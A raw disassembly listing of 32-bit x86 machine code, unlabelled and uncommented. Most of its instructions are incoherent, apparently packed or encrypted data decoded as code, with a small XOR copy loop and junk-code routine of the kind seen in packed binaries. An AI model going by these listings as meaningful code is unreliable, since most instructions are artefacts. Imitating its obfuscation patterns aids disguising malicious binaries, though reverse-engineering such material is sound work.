  403129:	or     ecx,DWORD PTR [ebp-0xc]
  40312c:	push   esi
  40312d:	retf   0xeaa2
  403130:	cmp    ch,BYTE PTR [edx-0x6b7dff6d]
  403136:	lock cmp al,dl
  403139:	pushf  
  40313a:	repnz mov eax,ds:0x665ed212
  403140:	mov    ch,0xc3
  403142:	ss enter 0x6711,0x91
  403147:	in     al,dx
  403148:	jmp    0x9a1a:0x2e3badeb
  40314f:	mov    ebp,0x3940c8eb
  403154:	pop    es
  403155:	loop   0x4030e1
  403157:	jge    0x403165
  403159:	leave  
  40315a:	push   eax
  40315b:	dec    eax
  40315c:	fisubr WORD PTR [ecx+edi*4+0x7fd7c30e]
  403163:	sahf   
  403164:	inc    edi
  403165:	or     dh,dl
  403167:	test   DWORD PTR [ecx],eax
  403169:	xor    bl,dl
  40316b:	xchg   ecx,eax
  40316c:	mov    ebp,DWORD PTR [esi]
  40316e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40316f:	cmp    BYTE PTR [ecx],0xbf
  403172:	lods   al,BYTE PTR ds:[esi]
  403173:	(bad)  
  403174:	adc    DWORD PTR [ebp+0x7076ce3d],0x6e
  40317b:	dec    edi
  40317c:	into   
  40317d:	cmp    al,0xdf
  40317f:	lds    ebp,FWORD PTR [edi]
  403181:	ret    
  403182:	or     cl,0xaf
  403185:	popf   
  403186:	iret   
  403187:	retf   
  403188:	lods   eax,DWORD PTR ds:[esi]
  403189:	iret   
  40318a:	xchg   ebx,eax
  40318b:	inc    ebx
  40318c:	cmp    BYTE PTR [ebx],dl
  40318e:	jb     0x4031b3
  403190:	into   
  403191:	jae    0x403206
  403193:	xor    al,0xb3
  403195:	ins    DWORD PTR es:[edi],dx
  403196:	push   ss
  403197:	cmp    bl,al
  403199:	mov    dh,0xf3
  40319b:	aad    0xe2
  40319d:	(bad)  
  40319e:	sahf   
  40319f:	push   esp
  4031a0:	fnsave cs:[esp+eax*1-0x4fc01886]
  4031a8:	cmp    BYTE PTR [eax+esi*1+0x5739d0da],dh
  4031af:	inc    ecx
  4031b0:	sbb    DWORD PTR [esi+0x69b62e19],ebp
  4031b6:	xchg   esi,eax
  4031b7:	add    edi,esp
  4031b9:	inc    eax
  4031ba:	add    al,dl
  4031bc:	mov    ds:0xf8a4aabc,al
  4031c1:	xchg   edx,eax
  4031c2:	call   0x485b:0x42ffbcf
  4031c9:	cs (bad) 
  4031cb:	lahf   
  4031cc:	test   DWORD PTR [edi+0x7a],ebp
  4031cf:	inc    eax
  4031d0:	test   eax,0x4f836946
  4031d5:	ret    
  4031d6:	aaa    
  4031d7:	cli    
  4031d8:	enter  0x5b69,0x93
  4031dc:	mov    WORD PTR ds:0x1eaf2ce2,ss
  4031e2:	inc    esp
  4031e3:	mov    esp,0x2b39718a
  4031e8:	out    0x4f,al
  4031ea:	(bad)  
  4031eb:	adc    BYTE PTR [ebp+0x2dbe0bae],bh
  4031f1:	or     DWORD PTR [ecx+0x519c34c1],ebp
  4031f7:	mov    ecx,0x7b47dd9f
  4031fc:	push   cs
  4031fd:	sbb    dl,bh
  4031ff:	imul   edx,DWORD PTR [ebx-0x462b7965],0xffffffe6
  403206:	cdq    
  403207:	sbb    BYTE PTR [eax-0x1d330df],bh
  40320d:	jmp    0x403203
  40320f:	std    
  403210:	push   esp
  403211:	mov    ds:0xdaf202a,eax
  403216:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403217:	xchg   edx,eax
  403218:	sti    
  403219:	cmp    DWORD PTR [ebp-0x15],eax
  40321c:	jb     0x403245
  40321e:	mov    ebp,DWORD PTR [eax]
  403220:	lods   eax,DWORD PTR ds:[esi]
  403221:	in     al,0x31
  403223:	push   ds
  403224:	ror    DWORD PTR [esp+edx*4-0x1],0x68
  403229:	bound  ecx,QWORD PTR [esi+0x35ad349b]
  40322f:	inc    eax
  403230:	jne    0x403298
  403232:	stc    
  403233:	cli    
  403234:	sbb    al,0x61
  403236:	dec    eax
  403237:	sub    DWORD PTR [ebx],0xfffffff9
  40323a:	push   ebx
  40323b:	xor    BYTE PTR [ecx+esi*4],dl
  40323e:	push   ebx
  40323f:	outs   dx,DWORD PTR ds:[esi]
  403240:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403241:	ins    BYTE PTR es:[edi],dx
  403242:	and    bl,BYTE PTR ds:0x3bfac8cc
  403248:	mov    esp,edi
  40324a:	imul   esp,edi,0x23
  40324d:	in     eax,0x24
  40324f:	repnz xlat BYTE PTR ds:[ebx]
  403251:	sahf   
  403252:	xchg   DWORD PTR [ecx-0x14],esi
  403255:	dec    edx
  403256:	iret   
  403257:	lds    esi,FWORD PTR [edx+0x4fd3769e]
  40325d:	das    
  40325e:	dec    edi
  40325f:	maskmovq mm2,mm1
  403262:	add    eax,0x71ce7ce0
  403267:	mov    cl,BYTE PTR [esi+0x79]
  40326a:	ret    
  40326b:	pushf  
  40326c:	iret   
  40326d:	jb     0x4032b2
  40326f:	inc    ecx
  403270:	icebp  
  403271:	mov    dl,0xb0
  403273:	aas    
  403274:	(bad)  
  403275:	jne    0x4032ee
  403277:	jbe    0x40325d
  403279:	push   0x6bcbb6ad
  40327e:	adc    BYTE PTR [ebx+ebx*4+0x3f],cl
  403282:	loope  0x40329c
  403284:	repnz fnstsw WORD PTR [ebp+0x21]
  403288:	in     al,0xfb
  40328a:	push   esi
  40328b:	popa   
  40328c:	retf   
  40328d:	cmp    edx,DWORD PTR [eax+eax*4-0x54]
  403291:	pop    esi
  403292:	stos   BYTE PTR es:[edi],al
  403293:	in     eax,0x51
  403295:	cli    
  403296:	pop    edi
  403297:	jns    0x4032c1
  403299:	(bad)  
  40329b:	lock mov esp,0x12e9e651
  4032a1:	add    ah,BYTE PTR ds:0xb67e1b40
  4032a7:	xchg   edx,eax
  4032a8:	xchg   esi,eax
  4032a9:	leave  
  4032aa:	setne  BYTE PTR [ebp+0x1e]
  4032ae:	lahf   
  4032af:	and    al,BYTE PTR [ebx+0x608328ec]
  4032b5:	cmp    eax,0x1edb4d47
  4032ba:	sbb    eax,0xa2cec295
  4032bf:	stos   DWORD PTR es:[edi],eax
  4032c0:	pop    esp
  4032c1:	pop    es
  4032c2:	fadd   st(6),st
  4032c4:	dec    ebx
  4032c5:	test   ah,ch
  4032c7:	mov    esi,DWORD PTR [ecx]
  4032c9:	inc    ebx
  4032ca:	ficom  WORD PTR [ebp-0x23870ed5]
  4032d0:	aad    0xf4
  4032d2:	inc    ebx
  4032d3:	mov    edx,0x73553669
  4032d8:	push   es
  4032d9:	inc    esi
  4032db:	inc    esi
  4032dc:	fnsave [ecx]
  4032de:	push   ecx
  4032df:	sbb    edi,DWORD PTR [esi+0x19]
  4032e2:	xor    edi,DWORD PTR [eax-0x5]
  4032e5:	jae    0x40335e
  4032e7:	mov    esp,0xa1c44f9d
  4032ec:	sbb    ch,bh
  4032ee:	test   eax,0xd8760bbf
  4032f3:	(bad)  
  4032f4:	jae    0x4032db
  4032f6:	inc    ebp
  4032f7:	fdiv   DWORD PTR [edx+0x2c1dd1e8]
  4032fd:	sub    dh,BYTE PTR [esi]
  4032ff:	mov    edi,0x662afcf6
  403304:	mov    dh,0x8f
  403306:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403307:	int    0x58
  403309:	mov    dh,0x69
  40330b:	(bad)  
  40330c:	dec    ebx
  40330d:	sbb    ch,BYTE PTR [edi+0x1a]
  403310:	or     eax,0x660110fb
  403315:	mov    edx,0xa9aafe2
  40331a:	fisubr DWORD PTR [ebx]
  40331c:	js     0x4032a6
  40331e:	or     BYTE PTR [esp+ebp*8],cl
  403321:	push   esi
  403322:	and    BYTE PTR [ecx+0x12],al
  403325:	daa    
  403326:	push   ebx
  403327:	xor    al,0xbd
  403329:	into   
  40332a:	idiv   dh
  40332c:	scas   al,BYTE PTR es:[edi]
  40332d:	(bad)  
  40332e:	gs sahf 
  403330:	test   al,0x48
  403332:	ins    DWORD PTR es:[edi],dx
  403333:	adc    eax,0x79338d33
  403338:	jl     0x403324
  40333a:	test   eax,0x314dadba
  403340:	dec    edx
  403341:	mov    ss,ebx
  403343:	je     0x40330a
  403345:	ret    
  403346:	nop
  403347:	mov    ecx,0x2843b30b
  40334c:	adc    eax,0xd8ceb992
  403351:	scas   eax,DWORD PTR es:[edi]
  403352:	sar    al,1
  403354:	out    dx,al
  403355:	or     ebx,ebx
  403357:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403358:	dec    ebx
  403359:	dec    esp
  40335a:	cmp    bh,BYTE PTR [ecx+0x6f11b34e]
  403360:	jne    0x403351
  403362:	popa   
  403363:	icebp  
  403364:	cmp    BYTE PTR [edi+0x19],0x18
  403368:	mov    cs,WORD PTR [ebp+0x68f17490]
  40336e:	call   0x202d:0xddba6ee1
  403375:	jb     0x403321
  403377:	(bad)  
  403378:	(bad)  
  403379:	outs   dx,BYTE PTR ds:[esi]
  40337a:	test   BYTE PTR [ecx+0x110b056b],al
  403380:	test   BYTE PTR [esi],al
  403382:	push   eax
  403383:	add    BYTE PTR [eax+0x1eeb93ff],al
  403389:	pushf  
  40338a:	sbb    BYTE PTR [ebp-0x6d97676d],bh
  403390:	cmp    BYTE PTR [edx],al
  403392:	and    cl,BYTE PTR [ebx+0x19cb9c18]
  403398:	and    ecx,DWORD PTR [ecx-0x78]
  40339b:	mov    esi,DWORD PTR [ebp+0x8]
  40339e:	imul   edi,edx
  4033a1:	mov    ebx,DWORD PTR [ebp+0xc]
  4033a4:	xor    eax,ecx
  4033a6:	add    eax,edx
  4033a8:	jmp    0x403687
  4033ad:	jecxz  0x4033d3
  4033af:	fcom   DWORD PTR [edx]
  4033b1:	out    0xd2,eax
  4033b3:	icebp  
  4033b4:	icebp  
  4033b5:	pop    es
  4033b6:	xchg   edx,eax
  4033b7:	aaa    
  4033b8:	aas    
  4033b9:	shl    BYTE PTR [ebx-0x5b],0xcb
  4033bd:	cmp    dl,BYTE PTR [eax+esi*2]
  4033c0:	jo     0x403380
  4033c2:	jle    0x403434
  4033c4:	jo     0x40342b
  4033c6:	xlat   BYTE PTR ds:[ebx]
  4033c7:	jge    0x40335f
  4033c9:	loop   0x4033a8
  4033cb:	int    0x5d
  4033cd:	in     eax,dx
  4033ce:	xchg   ebp,eax
  4033cf:	data16 (bad) 
  4033d1:	pushf  
  4033d2:	adc    eax,0x60cc2264
  4033d7:	mov    al,0x88
  4033d9:	leave  
  4033da:	mov    ?,WORD PTR [ebx+0x6850b538]
  4033e0:	mov    al,0x4d
  4033e2:	jbe    0x4033e3
  4033e4:	mov    dh,0xf8
  4033e6:	cmp    eax,0xf977bc7a
  4033eb:	fwait
  4033ec:	mov    ecx,fs
  4033ee:	lock pop ecx
  4033f0:	sbb    DWORD PTR [ebx],esi
  4033f2:	mov    WORD PTR [ecx+eiz*2+0x462d1733],ds
  4033f9:	sub    bl,BYTE PTR [ecx+0x6f]
  4033fc:	(bad)  
  4033fd:	shl    BYTE PTR [esi+0x50],0x1d
  403401:	cwde   
  403402:	popf   
  403403:	iret   
  403404:	arpl   WORD PTR [ecx+eax*4],ax
  403407:	add    DWORD PTR [edi],ebp
  403409:	iret   
  40340a:	enter  0x1cd0,0xc5
  40340e:	js     0x4033f9
  403410:	xchg   DWORD PTR [eax+0x5b],esp
  403413:	call   0xfde5:0x2c370d34
  40341a:	lods   al,BYTE PTR ds:[esi]
  40341b:	mov    fs,WORD PTR [ecx+0x60]
  40341e:	xchg   DWORD PTR [ebx],ecx
  403420:	sub    eax,0xa7e7f7e3
  403425:	leave  
  403426:	cli    
  403427:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403428:	test   al,0xd7
  40342a:	dec    eax
  40342b:	jp     0x40349d
  40342d:	adc    eax,0xef39ac4f
  403432:	inc    esi
  403433:	popa   
  403434:	add    ebx,DWORD PTR [edx-0x7eb4dea4]
  40343a:	dec    esi
  40343b:	mov    bl,0x5c
  40343d:	fwait
  40343e:	xchg   esp,eax
  40343f:	jo     0x4033c6
  403441:	popa   
  403442:	dec    ecx
  403443:	(bad)  
  403444:	addr16 sbb eax,0x9213a620
  40344a:	mov    ds:0x91cec499,al
  40344f:	mov    WORD PTR [ebx-0xc74ba33],gs
  403455:	jne    0x403491
  403457:	ret    
  403458:	pop    ebp
  403459:	sbb    ebx,DWORD PTR [ebx+0x78c90fee]
  40345f:	test   BYTE PTR [esi-0x6d],0x7b
  403463:	jbe    0x403434
  403465:	stos   BYTE PTR es:[edi],al
  403466:	cmp    cl,BYTE PTR [ebx+0x7c]
  403469:	push   cs
  40346a:	fs sbb al,0xc3
  40346d:	jmp    0xa0af:0xc11c9deb
  403474:	lahf   
  403475:	cld    
  403476:	push   ss
  403477:	imul   edi,ecx,0x23
  40347a:	dec    edi
  40347b:	mov    edi,0xed4e4455
  403480:	pop    ss
  403481:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403482:	jge    0x4034c9
  403484:	jno    0x403424
  403486:	adc    DWORD PTR [edi+0x3fa73b3a],0xffffffeb
  40348d:	in     eax,dx
  40348e:	add    dh,BYTE PTR [ebx-0x63]
  403491:	hlt    
  403492:	scas   al,BYTE PTR es:[edi]
  403493:	lahf   
  403494:	inc    ebx
  403495:	pandn  mm3,QWORD PTR [ebp-0x63c5b075]
  40349c:	jecxz  0x4034db
  40349e:	ja     0x4034be
  4034a0:	mov    cl,0x10
  4034a2:	gs (bad) 
  4034a4:	gs or  al,0x83
  4034a7:	paddsb mm4,mm4
  4034aa:	cwde   
  4034ab:	js     0x403432
  4034ad:	mov    al,0xc4
  4034af:	nop
  4034b0:	mov    ebx,0x7c705936
  4034b5:	ret    
  4034b6:	adc    DWORD PTR [edi],0x75e43b80
  4034bc:	inc    esp
  4034bd:	ret    
  4034be:	add    eax,0x6cda1ebc
  4034c3:	dec    esi
  4034c4:	rol    ah,cl
  4034c6:	pop    ebp
  4034c7:	dec    eax
  4034c8:	aad    0x2f
  4034ca:	push   eax
  4034cb:	or     bh,BYTE PTR [ebx+0x1e]
  4034ce:	ss inc esp
  4034d0:	push   0x7c
  4034d2:	add    DWORD PTR [edx+0x3c],edx
  4034d5:	jne    0x4034f9
  4034d7:	outs   dx,BYTE PTR ds:[esi]
  4034d8:	or     al,0x49
  4034da:	push   ecx
  4034db:	ja     0x403548
  4034dd:	ss das 
  4034df:	mov    al,ds:0xb1bd25f
  4034e4:	push   ebp
  4034e5:	mov    ah,0xc2
  4034e7:	dec    eax
  4034e8:	fstp   TBYTE PTR [eax+eax*8-0x23]
  4034ec:	test   al,0x47
  4034ee:	mov    edi,0x5cd4d2e7
  4034f3:	pop    ss
  4034f4:	jle    0x403496
  4034f6:	and    BYTE PTR [ecx-0x75f33f38],ah
  4034fc:	fs push ebp
  4034fe:	jae    0x4034ec
  403500:	add    ah,al
  403502:	cmp    cl,BYTE PTR [si]
  403505:	add    eax,0xbdf82fdb
  40350a:	jbe    0x4034ce
  40350c:	lea    ebx,[ecx+ecx*1-0x7b]
  403510:	push   esp
  403511:	push   cs
  403512:	(bad)  [esi-0x255c9999]
  403518:	ins    BYTE PTR es:[edi],dx
  403519:	retf   0x3c06
  40351c:	pop    eax
  40351d:	ins    BYTE PTR es:[edi],dx
  40351e:	xchg   ebp,eax
  40351f:	(bad)  
  403520:	jae    0x403526
  403522:	rcr    BYTE PTR [ecx-0x52],cl
  403525:	in     eax,dx
  403526:	mov    al,0x94
  403528:	mov    al,0xcd
  40352a:	outs   dx,BYTE PTR ds:[esi]
  40352b:	jae    0x4034c4
  40352d:	ror    ch,cl
  40352f:	(bad)  
  403531:	ffree  st(6)
  403533:	mov    ds:0x81760e44,al
  403538:	push   ss
  403539:	pop    ebx
  40353a:	xchg   ebx,eax
  40353b:	pop    eax
  40353c:	repz and eax,0xb92055c1
  403542:	adc    eax,0x362c4f77
  403547:	cmp    al,0x92
  403549:	daa    
  40354a:	into   
  40354b:	into   
  40354c:	sub    eax,0xdac8eeaa
  403551:	xchg   BYTE PTR [ebp+0x7bd9546a],ch
  403557:	pop    ebx
  403558:	dec    esi
  403559:	out    0xcc,eax
  40355b:	cmp    ah,BYTE PTR [ebp+0x56]
  40355e:	and    ah,BYTE PTR [esi+0x3b35b232]
  403564:	cmp    eax,0x33fb09c9
  403569:	xor    BYTE PTR [ebp-0x7a9041ac],dl
  40356f:	cmp    eax,DWORD PTR [esi+eiz*4+0x50]
  403573:	dec    edi
  403574:	pop    ebx
  403575:	dec    esi
  403576:	out    0x9e,eax
  403578:	cwde   
  403579:	pop    edi
  40357a:	cmp    ah,BYTE PTR [esi+0x35]
  40357d:	mov    fs,ebx
  40357f:	dec    esi
  403580:	adc    BYTE PTR ds:0x9a4e303b,0x9c
  403587:	and    DWORD PTR [esi+0x47],0x65c44bf
  40358e:	aad    0xc7
  403590:	push   esp
  403591:	fstp   DWORD PTR [ebp-0x7d841361]
  403597:	mov    ah,BYTE PTR [ecx]
  403599:	mov    edx,0xa106d20e
  40359e:	test   DWORD PTR [ecx+0x1e],ecx
  4035a1:	push   eax
  4035a2:	mov    edx,0x7c90b209
  4035a7:	inc    esi
  4035a8:	nop
  4035a9:	ficomp DWORD PTR [ebx+0x7153d97f]
  4035af:	lods   eax,DWORD PTR ds:[esi]
  4035b0:	fidivr DWORD PTR ds:0xf8958620
  4035b6:	dec    esp
  4035b7:	inc    esi
  4035b8:	xor    ah,dh
  4035ba:	jb     0x40354f
  4035bc:	mov    dl,0x3e
  4035be:	loope  0x4035b9
  4035c0:	mov    eax,ds:0x908af845
  4035c5:	lds    ebx,FWORD PTR [edi+0x5f]
  4035c8:	adc    eax,0xfba71312
  4035cd:	adc    eax,0x1a9176a8
  4035d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4035d3:	or     BYTE PTR [ebx+0x5c],ch
  4035d6:	dec    ecx
  4035d7:	call   0xc689:0x2d68b8de
  4035de:	add    ah,BYTE PTR [bp+di+0x2a]
  4035e2:	inc    esp
  4035e3:	loop   0x40359a
  4035e5:	jg     0x403574
  4035e7:	xchg   ecx,eax
  4035e8:	(bad)  
  4035e9:	cli    
  4035ea:	dec    ebx
  4035eb:	xchg   ecx,eax
  4035ec:	pop    edi
  4035ed:	cmp    DWORD PTR [eax],0xfddf4099
  4035f3:	sbb    eax,0x3f5f73d4
  4035f8:	mov    gs,WORD PTR [esi]
  4035fa:	adc    bl,0xb4
  4035fd:	and    cl,BYTE PTR [edx]
  4035ff:	inc    edi
  403600:	adc    ecx,ecx
  403602:	stos   BYTE PTR es:[edi],al
  403603:	ret    0x488
  403606:	in     al,dx
  403607:	hlt    
  403608:	sbb    al,0x1a
  40360a:	mov    al,ds:0x78ebfd1c
  40360f:	xor    ebp,edi
  403611:	stos   BYTE PTR es:[edi],al
  403612:	ds pop edx
  403614:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403615:	sar    DWORD PTR [edx+eax*2],1
  403618:	pop    edi
  403619:	daa    
  40361a:	dec    eax
  40361b:	add    eax,edx
  40361d:	popa   
  40361e:	in     eax,dx
  40361f:	ja     0x40361c
  403621:	pop    ebx
  403622:	adc    eax,0x5117dd78
  403627:	mov    BYTE PTR [eax+eiz*4-0x44],bh
  40362b:	mov    cl,0x17
  40362d:	mov    bh,0x7c
  40362f:	int    0x6
  403631:	xchg   dh,dl
  403633:	or     al,0xd5
  403635:	test   BYTE PTR [eax+0xe],dh
  403638:	mov    DWORD PTR [edx+0x63],esp
  40363b:	popa   
  40363c:	sub    DWORD PTR [ebp-0x17],0x928aa195
  403643:	call   0xa09856af
  403648:	and    ebp,DWORD PTR [esi]
  40364a:	mov    ah,BYTE PTR [edi-0x42]
  40364d:	adc    dl,ah
  40364f:	cwde   
  403650:	mov    WORD PTR [ecx],cs
  403652:	pop    eax
  403653:	mov    edx,0x779fe58f
  403658:	aam    0x90
  40365a:	retf   
  40365b:	(bad)  
  40365d:	add    edi,esi
  40365f:	pop    ss
  403660:	sti    
  403661:	shr    DWORD PTR [ecx+0x20de390a],cl
  403667:	fsubr  QWORD PTR [ecx+0x3b21e4b8]
  40366d:	xchg   edx,eax
  40366e:	mov    bl,0x8a
  403670:	jle    0x403687
  403672:	addr16 inc ebx
  403674:	dec    edi
  403675:	es cmp ebp,esp
  403678:	cmp    al,0x11
  40367a:	cmp    eax,0xd124a812
  40367f:	dec    ecx
  403680:	aas    
  403681:	sbb    esp,DWORD PTR [eax-0x20]
  403684:	stc    
  403685:	test   al,0xd1
  403687:	mov    al,BYTE PTR [ebx+eax*1+0x32729c]
  40368e:	mov    BYTE PTR [edi+esi*1],al
  403691:	mov    eax,DWORD PTR [ebp-0x4]
  403694:	xor    eax,ecx
  403696:	lea    edx,[edx+eax*1+0x32729c]
  40369d:	mov    eax,DWORD PTR [ebp-0x4]
  4036a0:	xor    eax,ecx
  4036a2:	mov    esi,0xffcd8d64
  4036a7:	sub    esi,eax
  4036a9:	add    esi,DWORD PTR [ebp+0x10]
  4036ac:	cmp    edx,esi
  4036ae:	jbe    0x4030ad
  4036b4:	pop    ebx
  4036b5:	mov    eax,0xf89c8530
  4036ba:	pop    edi
  4036bb:	pop    esi
  4036bc:	leave  
  4036bd:	ret    0xc
  4036c0:	push   ebp
  4036c1:	mov    ebp,esp
  4036c3:	sub    esp,0x58
  4036c6:	mov    DWORD PTR ds:0x42fced,0x17
  4036d0:	cmp    DWORD PTR ds:0x42fced,0x0
  4036d7:	je     0x40372c
  4036dd:	cmp    DWORD PTR ds:0x42fced,0x7
  4036e4:	jne    0x4036fc
  4036ea:	push   0x0
  4036ec:	push   0x25f8
  4036f1:	push   0x8523
  4036f6:	call   DWORD PTR ds:0x42e2d7
  4036fc:	cmp    DWORD PTR ds:0x42fced,0x8
  403703:	jne    0x403717
  403709:	xor    eax,eax
  40370b:	or     eax,DWORD PTR ds:0x42fced
  403711:	dec    eax
  403712:	mov    ds:0x42fced,eax
  403717:	mov    eax,ds:0x42fced
  40371c:	dec    eax
  40371d:	mov    ds:0x42fced,eax
  403722:	jmp    0x4036d0
  403727:	adc    eax,0xdf
  40372c:	mov    ecx,DWORD PTR [ebp+0x8]
  40372f:	add    DWORD PTR ds:0x42e6f3,0x693e
  403739:	mov    eax,0x8a3e
  40373e:	adc    DWORD PTR ds:0x42e6f7,0x5ea2
  403748:	xor    ax,WORD PTR [ecx+0x20]
  40374c:	adc    DWORD PTR ds:0x42fd0d,ecx
  403752:	mov    ecx,0x3b04
  403757:	and    DWORD PTR ds:0x42e713,0x42e11c
  403761:	add    ax,cx
  403764:	mov    DWORD PTR ds:0x42fd7a,0x1b71
  40376e:	movzx  eax,ax
  403771:	mov    DWORD PTR [ebp-0xc],eax
  403774:	or     DWORD PTR ds:0x42e124,0x7677
  40377e:	mov    BYTE PTR [ebp-0x1],0x7f
  403782:	not    ecx
  403784:	lea    eax,[ebp-0x1]
  403787:	mov    DWORD PTR [ebp-0x10],eax
  40378a:	or     DWORD PTR ds:0x42e70f,ecx
  403790:	jmp    0x403af0
  403795:	out    0x52,eax
  403797:	out    0x78,al
  403799:	jno    0x40374f
  40379b:	in     eax,0x71
  40379d:	or     BYTE PTR [edx+0x68],bl
  4037a0:	and    DWORD PTR [ebx+0x5d],ebx
  4037a3:	mov    DWORD PTR [esi],ebp
  4037a5:	js     0x4037b8
  4037a7:	jo     0x403819
  4037a9:	cmp    eax,0x9970707d
  4037ae:	mov    si,0xae5e
  4037b2:	mov    esi,0x7cce18e5
  4037b7:	jecxz  0x403815
  4037b9:	push   0x945ccefa
  4037be:	xchg   BYTE PTR [esp+esi*4+0x79],bl
  4037c2:	sub    al,0x74
  4037c4:	fcomip st,st(2)
  4037c6:	mov    ch,0x56
  4037c8:	aad    0xd6
  4037ca:	add    DWORD PTR ds:0xb13aba4f,ebp
  4037d0:	xor    ch,BYTE PTR [edx]
  4037d2:	dec    ebp
  4037d3:	enter  0xa16b,0xcb
  4037d7:	pushf  
  4037d8:	outs   dx,BYTE PTR ds:[esi]
  4037d9:	lods   eax,DWORD PTR ds:[esi]
  4037da:	es (bad) 
  4037dc:	lock popa 
  4037de:	xchg   DWORD PTR [ebx],edx
  4037e0:	fbld   TBYTE PTR [ecx-0x22fe139b]
  4037e6:	dec    eax
  4037e7:	fld    QWORD PTR [eax+0x70ef5f84]
  4037ed:	mov    ch,0x32
  4037ef:	add    eax,0xbcbb27f9
  4037f4:	call   0xe610:0xbbd6eff0
  4037fb:	bound  edx,QWORD PTR [ecx-0x4c]
  4037fe:	(bad)  [eax-0x5eb9615f]
  403804:	popf   
  403805:	xchg   esi,eax
  403806:	fsubr  DWORD PTR [ecx]
  403808:	mov    eax,ds:0xce82bbc7
  40380d:	pop    ds
  40380e:	cdq    
  40380f:	cmp    BYTE PTR [esi-0xefa448c],bh
  403815:	out    0x9d,al
  403817:	rcl    dl,0xf0
  40381a:	inc    eax
  40381b:	add    BYTE PTR [ebp+0x2a9a31ee],bl
  403821:	loopne 0x403866
  403823:	(bad)  
  403824:	in     eax,dx
  403825:	retf   
  403826:	inc    eax
  403827:	dec    esp
  403828:	fs sub eax,0x6f15f626
  40382e:	test   DWORD PTR [esi+ebp*2+0x3858aaf3],eax
  403835:	sbb    bl,bl
  403837:	test   DWORD PTR [edx-0x307e3319],edi
  40383d:	arpl   WORD PTR [ebp-0x2f],si
  403840:	add    BYTE PTR [esi+0x30],bl
  403843:	xchg   esp,eax
  403844:	and    al,bl
  403846:	sahf   
  403847:	in     al,dx
  403848:	lock jnp 0x4037e0
  40384b:	ret    
  40384c:	scas   eax,DWORD PTR es:[edi]
  40384d:	aad    0xcb
  40384f:	aas    
  403850:	out    0xec,eax
  403852:	sti    
  403853:	add    al,0x6b
  403855:	sub    edi,DWORD PTR [edx+0x557c5f59]
  40385b:	mov    edi,0x30320c61
  403860:	dec    ecx
  403861:	and    BYTE PTR [ebx],0x2c
  403864:	aas    
  403865:	push   eax
  403866:	and    al,0x2
  403868:	lds    ecx,FWORD PTR [edx+0x13]
  40386b:	lahf   
  40386c:	jno    0x4038e3
  40386e:	jmp    0x4038e0
  403870:	gs icebp 
  403872:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403873:	call   0xfa5f:0xef3302bf
  40387a:	loopne 0x40389d
  40387c:	and    ebx,esi
  40387e:	out    dx,eax
  40387f:	xor    BYTE PTR [esi+0x1fe96e7f],bl
  403885:	inc    ebx
  403886:	sbb    al,0x7a
  403888:	xchg   ebp,edi
  40388a:	je     0x4038ae
  40388c:	(bad)  
  40388e:	(bad)  
  40388f:	mov    ch,0x32
  403891:	inc    edx
  403892:	xchg   ebx,eax
  403893:	sub    eax,0x68ccd6cf
  403898:	add    ah,0x52
  40389b:	ret    
  40389c:	pop    ecx
  40389d:	out    0x8b,eax
  40389f:	cmp    DWORD PTR [edx-0x398233da],edx
  4038a5:	xor    edx,DWORD PTR [eax]
  4038a7:	adc    BYTE PTR [eax-0x6ffc2010],cl
  4038ad:	cwde   
  4038ae:	aam    0x11
  4038b0:	lock xchg ebp,eax
  4038b2:	jno    0x260c36a9
  4038b8:	sar    esp,0xbf
  4038bb:	out    0x6e,eax
  4038bd:	imul   ebp,DWORD PTR [ebx-0x12525fe5],0xa951fcda
  4038c7:	jae    0x4038dc
  4038c9:	aam    0xb9
  4038cb:	push   0x41f7d9c6
  4038d0:	jecxz  0x403897
  4038d2:	sbb    al,0x5e
  4038d4:	xchg   ah,bl
  4038d6:	mov    esp,0x5c9f6017
  4038db:	fsub   DWORD PTR ss:[ebx]
  4038de:	jb     0x403945
  4038e0:	mov    edi,0x48fa424e
  4038e5:	cld    
  4038e6:	mov    ecx,0xa878ea4a
  4038eb:	addr16 fcmove st,st(1)
  4038ee:	hlt    
  4038ef:	jp     0x4038c1
  4038f1:	rcr    DWORD PTR [eax-0x67],cl
  4038f4:	out    dx,al
  4038f5:	ins    BYTE PTR es:[edi],dx
  4038f6:	push   ebx
  4038f7:	sub    DWORD PTR [ecx-0x76],0x24
  4038fb:	or     BYTE PTR ds:0x66e843e1,al
  403901:	jl     0x4038f3
  403903:	shl    DWORD PTR [edx-0x50],1
  403906:	xlat   BYTE PTR ds:[ebx]
  403907:	inc    esi
  403908:	and    dl,BYTE PTR [esp+ebx*4+0x2b]
  40390c:	jle    0x403940
  40390e:	adc    cl,ah
  403910:	sub    al,0x6b
  403912:	popa   
  403913:	mov    al,ds:0xbef79246
  403918:	pop    ebp
  403919:	push   0x2635fadd
  40391e:	aad    0x5d
  403920:	mov    BYTE PTR [edi+0x5a790837],cl
  403926:	cdq    
  403927:	xchg   dh,bl
  403929:	ss stc 
  40392b:	sub    al,0x64
  40392d:	mov    ebx,0xfec737e5
  403932:	inc    esi
  403933:	int3   
  403934:	jnp    0x4038db
  403936:	inc    edx
  403937:	stos   BYTE PTR es:[edi],al
  403938:	xor    edi,ebp
  40393a:	sbb    ch,bh
  40393c:	jb     0x40391e
  40393e:	out    0x67,eax
  403940:	adc    BYTE PTR [ebx+0x59ede2e0],al
  403946:	cli    
  403947:	ins    DWORD PTR es:[edi],dx
  403948:	mov    BYTE PTR [edi-0x2e14465b],dl
  40394e:	repnz into 
  403950:	xor    DWORD PTR [eax-0x5d2b5b8f],esi
  403956:	rcr    BYTE PTR [ebx],cl
  403958:	sbb    DWORD PTR [esi+edx*1-0x53],esi
  40395c:	mov    ds:0xfadaaf5c,eax
  403961:	cmp    DWORD PTR [edx],esp
  403963:	pop    ebp
  403964:	add    DWORD PTR [ecx+0x2d],esp
  403967:	test   dh,al
  403969:	and    BYTE PTR [ebp-0x21a4935b],al
  40396f:	push   ecx
  403970:	clc    
  403971:	jne    0x403927
  403973:	inc    edi
  403974:	mov    ecx,0xf740f93
